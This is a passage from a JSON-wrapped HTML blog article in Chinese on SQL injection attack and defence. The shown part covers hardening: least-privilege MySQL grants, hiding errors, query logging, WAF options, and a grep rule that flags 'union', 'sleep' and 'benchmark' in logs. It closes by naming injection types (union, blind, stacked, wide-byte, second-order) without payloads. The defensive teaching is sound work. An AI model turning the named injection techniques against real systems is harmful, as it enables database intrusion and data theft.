class=\"hljs-keyword\">BY</span> <span class=\"hljs-string\">&#x27;strong_password&#x27;</span>;<br><span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">SELECT</span>, <span class=\"hljs-keyword\">INSERT</span>, <span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">ON</span> webapp_db.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">&#x27;webapp&#x27;</span>@<span class=\"hljs-string\">&#x27;localhost&#x27;</span>;<br><span class=\"hljs-comment\">-- 禁止DROP, ALTER, FILE等危险权限</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>关闭错误信息显示</strong></li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">// 生产环境关闭错误显示</span><br><span class=\"hljs-built_in\">ini_set</span>(&#x27;display_errors&#x27;, <span class=\"hljs-number\">0</span>);<br><span class=\"hljs-built_in\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>启用SQL查询日志</strong></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-comment\">-- MySQL启用慢查询日志</span><br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> slow_query_log <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&#x27;ON&#x27;</span>;<br><span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">GLOBAL</span> long_query_time <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"WAF与监控\"><a href=\"#WAF与监控\" class=\"headerlink\" title=\"WAF与监控\"></a>WAF与监控</h3><ol>\n<li><strong>部署Web应用防火墙</strong></li>\n</ol>\n<ul>\n<li>ModSecurity规则集</li>\n<li>云WAF服务（阿里云、腾讯云等）</li>\n<li>自定义过滤规则</li>\n</ul>\n<ol>\n<li><strong>实时监控与告警</strong></li>\n</ol>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 监控异常SQL查询</span><br>tail <span class=\"hljs-punctuation\">-</span>f /var/<span class=\"hljs-built_in\">log</span>/mysql/mysql.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-string\">| grep -i &quot;</span>union\\<span class=\"hljs-string\">|sleep\\|benchmark&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>SQL注入漏洞虽然是一个”老”问题，但在实际的渗透测试和安全评估中仍然大量存在。理解各种注入类型的原理和利用方法，对于安全研究人员发现漏洞、开发人员修复漏洞都具有重要意义。</p>\n<p><strong>关键要点回顾</strong>：</p>\n<ul>\n<li>错误注入利用数据库报错获取信息</li>\n<li>联合注入通过union语句直接获取数据</li>\n<li>时间盲注和布尔盲注适用于无回显场景</li>\n<li>堆叠注入危险性最高，可执行任意SQL操作</li>\n<li>宽字节注入针对特定编码环境</li>\n<li>二次注入具有较强的隐蔽性</li>\n</ul>\n<p><strong>防护核心</strong>：</p>\n<ul>\n<li>使用参数化查询是最有效的防护手段</li>\n<li>输入验证和输出编码同样重要</li>\n<li>遵循最小权限原则配置数据库权限</li>\n<li>定期进行安全评估和代码审计</li>\n</ul>\n<p>希望本文能够帮助读者全面理解SQL注入的攻防技术，在实际工作中更好地保护Web应用程序的安全。</p>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "SQL注入",
                "渗透测试",
                "网络安全"
            ]
        }
    ]
}